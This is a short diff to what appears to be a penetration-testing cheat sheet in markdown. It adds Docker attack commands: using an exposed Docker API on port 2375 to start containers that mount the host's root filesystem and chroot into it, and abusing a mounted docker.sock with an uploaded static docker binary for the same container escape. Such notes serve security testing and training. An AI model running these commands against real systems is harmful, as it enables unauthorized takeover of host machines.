@@ -511,8 +511,11 @@ To start a container from a remote machine <br/>
 `docker -H <ip>:2375 exec -it <container-id> /bin/sh`<br/>
 To start a container from a remote machine using name and tags<br/>
 `docker -H <ip>:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh`<br/>
-Break out of docker container
-`docker -H tcp://<ip>:2375 run --rm -it -v /:/host <container_name> chroot /host bash`
+Break out of docker container<br/>
+`docker -H tcp://<ip>:2375 run --rm -it -v /:/host <container_name> chroot /host bash`<br/>
+If docker.sock is on conatiner , upload static docker binary<br/>
+`./docker -H unix:///var/run/docker.sock images`<br/>
+`./docker -H unix:///var/run/docker.sock run -it -v /:/host/ wordpress chroot /host`<br/>
 # Miscellaneous
 
 ## Turning off xfce beeping sound
